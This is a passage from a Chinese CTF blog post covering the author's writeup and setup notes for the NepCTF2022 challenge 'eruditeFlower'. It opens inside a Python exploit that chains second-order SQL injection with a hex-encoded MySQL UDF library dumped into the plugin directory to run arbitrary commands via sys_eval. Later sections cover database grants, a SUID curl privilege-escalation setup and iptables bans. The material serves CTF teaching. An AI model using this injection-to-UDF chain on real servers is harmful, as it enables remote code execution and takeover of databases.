08C60001EB1F42C6442DFF0031C04883C9FF4889EFF2AE488B44241048F7D148FFC94889084883C4184889E85B5D415C415D415E415FC34883EC08833E014889D7750B488B460831D2833800740E488D353A020000E817FDFFFFB20188D05EC34883EC08833E014889D7750B488B460831D2833800740E488D3511020000E8EEFCFFFFB20188D05FC3554889FD534889D34883EC08833E027409488D3519020000EB3F488B46088338007409488D3526020000EB2DC7400400000000488B4618488B384883C70248037808E801FCFFFF31D24885C0488945107511488D351F0200004889DFE887FCFFFFB20141585B88D05DC34883EC08833E014889F94889D77510488B46088338007507C6010131C0EB0E488D3576010000E853FCFFFFB0014159C34154488D35EF0100004989CC4889D7534889D34883EC08E832FCFFFF49C704241E0000004889D8415A5B415CC34883EC0831C0833E004889D7740E488D35D5010000E807FCFFFFB001415BC34883EC08488B4610488B38E862FBFFFF5A4898C34883EC28488B46184C8B4F104989F2488B08488B46104C89CF488B004D8D4409014889C6F3A44C89C7498B4218488B0041C6040100498B4210498B5218488B4008488B4A08BA010000004889C6F3A44C89C64C89CF498B4218488B400841C6040000E867FBFFFF4883C4284898C3488B7F104885FF7405E912FBFFFFC3554889CD534C89C34883EC08488B4610488B38E849FBFFFF4885C04889C27505C60301EB1531C04883C9FF4889D7F2AE48F7D148FFC948894D00595B4889D05DC39090909090909090554889E5534883EC08488B05C80320004883F8FF7419488D1DBB0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E86FFBFFFF4883C408C345787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D657465720045787065637465642065786163746C792074776F20617267756D656E747300457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E34004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F290000011B033B980000001200000040FBFFFFB400000041FBFFFFCC00000042FBFFFFE400000043FBFFFFFC00000044FBFFFF1401000047FBFFFF2C01000048FBFFFF44010000E2FBFFFF6C010000CAFCFFFFA4010000F3FCFFFFBC0100001CFDFFFFD401000086FDFFFFF4010000B6FDFFFF0C020000E3FDFFFF2C02000002FEFFFF4402000016FEFFFF5C02000084FEFFFF7402000093FEFFFF8C0200001400000000000000017A5200017810011B0C070890010000140000001C00000084FAFFFF01000000000000000000000014000000340000006DFAFFFF010000000000000000000000140000004C00000056FAFFFF01000000000000000000000014000000640000003FFAFFFF010000000000000000000000140000007C00000028FAFFFF030000000000000000000000140000009400000013FAFFFF01000000000000000000000024000000AC000000FCF9FFFF9A00000000420E108C02480E18410E20440E3083048603000000000034000000D40000006EFAFFFFE800000000420E10470E18420E208D048E038F02450E28410E30410E38830786068C05470E50000000000000140000000C0100001EFBFFFF2900000000440E100000000014000000240100002FFBFFFF2900000000440E10000000001C0000003C01000040FBFFFF6A00000000410E108602440E188303470E200000140000005C0100008AFBFFFF3000000000440E10000000001C00000074010000A2FBFFFF2D00000000420E108C024E0E188303470E2000001400000094010000AFFBFFFF1F00000000440E100000000014000000AC010000B6FBFFFF1400000000440E100000000014000000C4010000B2FBFFFF6E00000000440E300000000014000000DC01000008FCFFFF0F00000000000000000000001C000000F4010000FFFBFFFF4100000000410E108602440E188303470E2000000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF000000000000000000000000000000000100000000000000B2010000000000000C00000000000000A00B0000000000000D00000000000000781100000000000004000000000000005801000000000000F5FEFF6F00000000A00200000000000005000000000000006807000000000000060000000000000060030000000000000A00000000000000E0010000000000000B0000000000000018000000000000000300000000000000E81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200A0000000000000700000000000000C0090000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000A009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000004809000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000CE0B000000000000DE0B000000000000EE0B000000000000FE0B0000000000000E0C0000000000001E0C0000000000002E0C0000000000003E0C0000000000004E0C0000000000005E0C0000000000006E0C0000000000007E0C0000000000008E0C0000000000009E0C000000000000AE0C000000000000BE0C0000000000008017200000000000004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200002E7368737472746162002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E64796E616D6963002E676F74002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000B000000F6FFFF6F0200000000000000A002000000000000A002000000000000C000000000000000030000000000000008000000000000000000000000000000150000000B00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001D00000003000000020000000000000068070000000000006807000000000000E00100000000000000000000000000000100000000000000000000000000000025000000FFFFFF6F020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000FEFFFF6F0200000000000000A009000000000000A009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000C009000000000000C00900000000000060000000000000000300000000000000080000000000000018000000000000004B000000040000000200000000000000200A000000000000200A0000000000008001000000000000030000000A0000000800000000000000180000000000000055000000010000000600000000000000A00B000000000000A00B000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000B80B000000000000B80B00000000000010010000000000000000000000000000040000000000000010000000000000005B000000010000000600000000000000D00C000000000000D00C000000000000A80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000E000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000DD000000000000000000000000000000010000000000000001000000000000006F000000010000000200000000000000641200000000000064120000000000009C000000000000000000000000000000040000000000000000000000000000007D000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008E000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009A000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000A3000000010000000300000000000000D016200000000000D0160000000000001800000000000000000000000000000008000000000000000800000000000000A8000000010000000300000000000000E816200000000000E8160000000000009800000000000000000000000000000008000000000000000800000000000000B1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000B7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000BC000000010000000000000000000000000000000000000088170000000000009B000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000C500000000000000000000000000000001000000000000000000000000000000 into dumpfile '/usr/lib64/mysql/plugin/exp.so';\x23"</span></span><span class="token punctuation">,</span>
        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'exp.so';\x23"</span></span><span class="token punctuation">,</span>
        <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>getRadmonStr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">';select sys_eval(\"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>CMD<span class="token punctuation">&#125;</span></span><span class="token string">\");\x23"</span></span>
    <span class="token punctuation">]</span>
    pocStudentId <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> poc<span class="token punctuation">:</span>
        pocStudentId<span class="token punctuation">.</span>append<span class="token punctuation">(</span>reg<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]Ready to get admin"</span><span class="token punctuation">)</span>
    login<span class="token punctuation">(</span>poc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pocStudentId<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    postAns<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*][?]set admin passwd: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    logout<span class="token punctuation">(</span><span class="token punctuation">)</span>
    loginRes <span class="token operator">=</span> login<span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span> passwd<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"something err0r"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> loginRes <span class="token keyword">and</span> <span class="token string">"错误"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> loginRes<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]login as admin success!"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exit<span class="token punctuation">(</span><span class="token string">"[-]login as admin fail!"</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]write out file"</span><span class="token punctuation">)</span>
    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*]create function"</span><span class="token punctuation">)</span>
    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*]exec cmd: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>CMD<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre>



<h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="中文乱码"><a href="#中文乱码" class="headerlink" title="中文乱码"></a>中文乱码</h3><p>这个是典中典的问题了，首先数据库设置编码</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> NAMES utf8mb4<span class="token punctuation">;</span></code></pre>

<p>其次表设置编码</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8</code></pre>

<p>发现还是有乱码，是php和mysql连接时候的问题，要在每个<code>$mysqli</code>前先设置字符集：<code>set names utf8</code></p>
<pre class="language-PHP" data-language="PHP"><code class="language-PHP">$mysqli &#x3D; new mysqli(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);
&#x2F;&#x2F; 每个$mysqli连接执行语句前都要先执行
mysqli_query($mysqli,&quot;set names utf8&quot;);</code></pre>

<p>这样就解决了中文乱码的问题</p>
<h3 id="x3D-x3D-x3D-与-x3D-x3D-的问题"><a href="#x3D-x3D-x3D-与-x3D-x3D-的问题" class="headerlink" title="&#x3D;&#x3D;&#x3D;与&#x3D;&#x3D;的问题"></a>&#x3D;&#x3D;&#x3D;与&#x3D;&#x3D;的问题</h3><p>在<code>register.php</code>中原先有判断<code>$_POST[&#39;username&#39;]==&#39;admin&#39;</code>，因为是弱等于，导致可以重新注册一个admin账号，复现如下</p>
<img src="/article/eruditeFlower/image-20221005111447545.png" class="" title="image-20221005111447545" loading="lazy">

<p>注册了账号，然后拿<code>admin</code>登录，非<code>admin%a0</code></p>
<img src="/article/eruditeFlower/image-20221005111513524.png" class="" title="image-20221005111513524" loading="lazy">

<p>登录成功。原先以为是环境的问题，后来发现是数据库交互的问题</p>
<p>在注册的时候有这样一句话</p>
<p><code>$username = $mysqli-&gt;escape_string($_POST[&#39;username&#39;]);</code></p>
<p>$mysqli-&gt;escape_string出来的username没有被正确存进去，而是数据库直接存了一个新的admin账号</p>
<img src="/article/eruditeFlower/image-20221005111744267.png" class="" title="image-20221005111744267" loading="lazy">

<p>我们把语句拿出来试一下</p>
<img src="/article/eruditeFlower/image-20221005111802999.png" class="" title="image-20221005111802999" loading="lazy">

<p>可以看到php传递sql语句的时候带了%a0（这里明显看到<code>admin </code>后面是有一个空位的），但是sql处理的时候没有认，如果设置了urlencode就能看到了</p>
<img src="/article/eruditeFlower/image-20221005111910450.png" class="" title="image-20221005111910450" loading="lazy">

<p>这里的问题可能将来也会是一个考点，一个小trick</p>
<p>既然是数据库的问题，那么就得更改数据的存储方式了，最后调试好想添加urlencode还是有点问题？</p>
<p>不管怎样首先把<code>register.php</code>判断改为强比较了</p>
<p><code>if ($_POST[&#39;username&#39;]===&#39;admin&#39;)</code></p>
<h3 id="admin登录上车的问题"><a href="#admin登录上车的问题" class="headerlink" title="admin登录上车的问题"></a>admin登录上车的问题</h3><p>因为二次注入可以修改admin密码，因为俺们是compose起的环境，平台不支持做动态靶机，比如说前一位选手改了admin密码为123，后一位随便一试结果进了……就很尴尬了。因为session是不清的，所以只要登录了admin就算通过，靶机重置也不会影响已经登录admin的选手。因此在login处添加了这一段</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"update users set studentid='<span class="token interpolation"><span class="token variable">$random</span></span>' where username='admin'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>不知道有没有选手爆破呢，概率很低当然也不是不可能，靶机重置同时也会重置admin密码，而靶机重置的密码规则是这样的</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">TRUNCATE</span> <span class="token keyword">TABLE</span> score<span class="token punctuation">.</span>users<span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> score<span class="token punctuation">.</span>users <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'`head /dev/urandom | cksum | md5sum | cut -c 1-32`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>选手并不知道，所以概率低，当然php中登录就修改admin密码只是加了一层复杂性，而且爆破会被ban的辣</p>
<h3 id="题目权限配给"><a href="#题目权限配给" class="headerlink" title="题目权限配给"></a>题目权限配给</h3><p>首先由于要写udf，而且是站库分离的结构，所以给予mysql的服务器插件目录写和执行权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> /usr/lib64/mysql/plugin/</code></pre>

<p>最后一步要用s位的curl提权，收回用户和组的权限，给curl添加s位</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">700</span> /flag <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +s /bin/curl</code></pre>

<h4 id="数据库的权限与被搅shi后的修改"><a href="#数据库的权限与被搅shi后的修改" class="headerlink" title="数据库的权限与被搅shi后的修改"></a>数据库的权限与被搅shi后的修改</h4><p>mysql新建了一个用户ctf，分别用到以下表</p>
<table>
<thead>
<tr>
<th align="center">表名</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">challengesAll</td>
<td align="center">所有的题目</td>
</tr>
<tr>
<td align="center">randChallenges</td>
<td align="center">用户抽取到的题目编号</td>
</tr>
<tr>
<td align="center">score</td>
<td align="center">用户做题得分</td>
</tr>
<tr>
<td align="center">userAnswer</td>
<td align="center">用户提交的答案</td>
</tr>
<tr>
<td align="center">users</td>
<td align="center">用户注册表</td>
</tr>
<tr>
<td align="center">ctf</td>
<td align="center">提示表</td>
</tr>
</tbody></table>
<p>看语句</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'ctf'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'123456'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>challengesAll <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>randChallenges <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>score <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>userAnswer <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>users <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>
<span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>ctf <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span>

<span class="token keyword">GRANT</span> <span class="token keyword">file</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></code></pre>

<p>后面会讲为何这样给予，最小权限原则</p>
<h5 id="challengesAll"><a href="#challengesAll" class="headerlink" title="challengesAll"></a>challengesAll</h5><p><code>challengesAll</code>是所有的题目，我只需要提取题目信息，在题目上线时已经确定，所以只需给予<code>select</code>权限即可</p>
<h5 id="randChallenges"><a href="#randChallenges" class="headerlink" title="randChallenges"></a>randChallenges</h5><p><code>randChallenges</code>是用户抽取到的题目，前面流程分析说过，用户在注册的时候会抽取题目插入到此表，因此需要<code>insert</code>权限，同时在主页用户需要做题，因此还需要<code>select</code>权限</p>
<h5 id="score-1"><a href="#score-1" class="headerlink" title="score"></a>score</h5><p><code>score</code>是用户的分数表，用户做完题后会插入一条记录记用户的分数，因此需要<code>select,insert</code>权限</p>
<h5 id="userAnswer"><a href="#userAnswer" class="headerlink" title="userAnswer"></a>userAnswer</h5><p><code>userAnswer</code>存储用户提交的答案，原因同上，也是需要<code>select,insert</code>权限</p>
<h5 id="users"><a href="#users" class="headerlink" title="users"></a>users</h5><p><code>users</code>是用户表，包括用户的增改查，是正常的注册系统的表权限，也就是这里可以出现修改admin密码的操作</p>
<h5 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h5><p><code>ctf</code>就是个提示表，没有交互，随意权限</p>
<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>因为要写udf，要给予<code>file,insert</code>权限来创建和落地</p>
<h4 id="比赛中出现搅💩的状况"><a href="#比赛中出现搅💩的状况" class="headerlink" title="比赛中出现搅💩的状况"></a>比赛中出现搅💩的状况</h4><p>某一天晚上，突然发现题目全部被人修改了，原因就是权限给多了</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></code></pre>

<p>图省事之前是这样给的权限，不符合最小权限原则，这次之后也是狠狠学习了一下</p>
<h5 id="临时措施"><a href="#临时措施" class="headerlink" title="临时措施"></a>临时措施</h5><p>当时出现了这样的情况，所以第一时间首先复原了题目，并且在群里通知选手不要修改了，因为这里对解题没有帮助，在此处也不存在非预期可以帮助解题，为了防止同学走歪路就通知了一下，但是没用，复原了还是被打了。</p>
<p>所以使用锁机制先限制一下，mysql有三种级别的锁定机制：表级锁定，行级锁定和页级锁定，首先锁定表，防止被进一步破坏</p>
<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">LOCK</span> <span class="token keyword">TABLES</span> challengesAll<span class="token punctuation">;</span></code></pre>

<p>然后开始检索权限，按照最小权限原则从新分配权限，最后下线题目，重新部署</p>
<h3 id="题目被爆破"><a href="#题目被爆破" class="headerlink" title="题目被爆破"></a>题目被爆破</h3><p>当时在解决搅shi的问题，然后发现多次警告后仍然有同学在爆破用户名和密码，直接手动封禁</p>
<p>从docker内部的话需要高级权限<code>--privileged</code>，但是这样会有安全性问题（著名的docker宿主机提权），于是直接在部署服务器上封禁，原先的命令是这样的</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iptables <span class="token parameter variable">-I</span> INPUT <span class="token parameter variable">-s</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-j</span> DROP <span class="token parameter variable">-dport</span> <span class="token punctuation">[</span>port<span class="token punctuation">]</span></code></pre>

<p>但是发现好像没生效，尝试了一下，需要配给docker用户，于是直接封禁</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">iptables <span class="token parameter variable">-I</span> DOCKER <span class="token parameter variable">-s</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-j</span> DROP</code></pre>

<p>直接封了</p>
<h3 id="题目重置"><a href="#题目重置" class="headerlink" title="题目重置"></a>题目重置</h3><p>环境需要重置，一是更新admin密码，二是清空用户数据和udf，比赛时间较长，要是一直不清会有大量数据</p>
<p>未完待续…</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">如果觉得我的文章对你有帮助，可以请俺喝冰阔落</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/alipay.jpg"><img loading="lazy" src="/images/alipay.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/qq.jpg"><img loading="lazy" src="/images/qq.jpg" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/wechat.jpg"><img loading="lazy" src="/images/wechat.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>Err0r</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://err0r.top/article/eruditeFlower/" title="NepCTF2022博学多闻的花花WP&amp;出题笔记">https://err0r.top/article/eruditeFlower/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/article/penetrationtest/" rel="next" title="记一次教师机环境的渗透"><span class="post-nav-text">记一次教师机环境的渗透</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>若您想及时得到回复提醒，建议私发邮件联系。</span><br><span>评论请遵守评论公德，博主会不定时检查评论并进行回复。</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/article/eruditeFlower/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">苏ICP备20028116号-1</a></div><div class="copyright"><span>&copy; 2020 – 2023 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Err0r</span></div><div class="live-time"><span>本博客已在各种灾难中运行了</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2020-10-20T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
}
blog_live_time();
</script></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#000000" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="想要搜些什么？" value=""></div><div class="search-result-container"></div></div><script>function initMourn() {
  const date = new Date();
  const today = (date.getMonth() + 1) + "-" + date.getDate()
  const mourn_days = ["4-4","9-18","12-13"]
  if (mourn_days.includes(today)) {
